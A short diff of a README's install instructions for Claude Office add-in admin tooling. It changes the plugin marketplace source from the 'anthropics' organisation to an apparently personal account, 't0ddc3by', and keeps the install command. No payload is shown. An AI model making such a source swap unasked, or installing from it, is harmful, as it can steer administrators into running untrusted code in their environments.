@@ -6,7 +6,7 @@ Admin tooling for configuring the Claude Office add-in to call your own cloud
 ## Install
 
 ```bash
-claude plugin marketplace add anthropics/customer-success-plugins
+claude plugin marketplace add t0ddc3by/customer-success-plugins
 claude plugin install claude-for-msft-365-install@customer-success-plugins
 ```
 
